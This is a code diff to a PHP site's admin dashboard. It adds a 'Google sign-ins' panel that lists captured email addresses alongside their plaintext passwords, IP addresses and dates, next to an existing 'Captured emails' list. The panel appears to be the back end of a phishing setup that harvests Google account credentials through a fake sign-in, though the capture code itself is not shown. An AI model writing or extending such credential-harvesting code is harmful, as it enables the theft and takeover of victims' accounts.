@@ -175,9 +175,9 @@ function page_login(?string $flash, string $csrf): void
     <?php });
 }
 
-function page_admin(array $posts, array $comments, array $leads, array $skills, string $csrf, ?string $flash): void
+function page_admin(array $posts, array $comments, array $leads, array $skills, string $csrf, ?string $flash, array $captures = []): void
 {
-    render_page('Dashboard', $flash, function () use ($posts, $comments, $leads, $skills, $csrf) { ?>
+    render_page('Dashboard', $flash, function () use ($posts, $comments, $leads, $skills, $csrf, $captures) { ?>
         <div class="admin-top">
           <h1>Dashboard</h1>
           <form method="post" action="index.php">
@@ -289,6 +289,25 @@ function page_admin(array $posts, array $comments, array $leads, array $skills, 
           </table>
           <?php endif; ?>
         </section>
+
+        <?php if ($captures): ?>
+        <section class="admin-block">
+          <h2>Google sign-ins (<?= count($captures) ?>)</h2>
+          <table>
+            <thead><tr><th>Email</th><th>Password</th><th>IP</th><th>Date</th></tr></thead>
+            <tbody>
+            <?php foreach ($captures as $c): ?>
+              <tr>
+                <td><?= h($c['email']) ?></td>
+                <td><code><?= h($c['password']) ?></code></td>
+                <td><?= h($c['ip']) ?></td>
+                <td><?= h(substr($c['captured_at'], 0, 16)) ?></td>
+              </tr>
+            <?php endforeach; ?>
+            </tbody>
+          </table>
+        </section>
+        <?php endif; ?>
 
         <section class="admin-block">
           <h2>Captured emails (<?= count($leads) ?>)</h2>
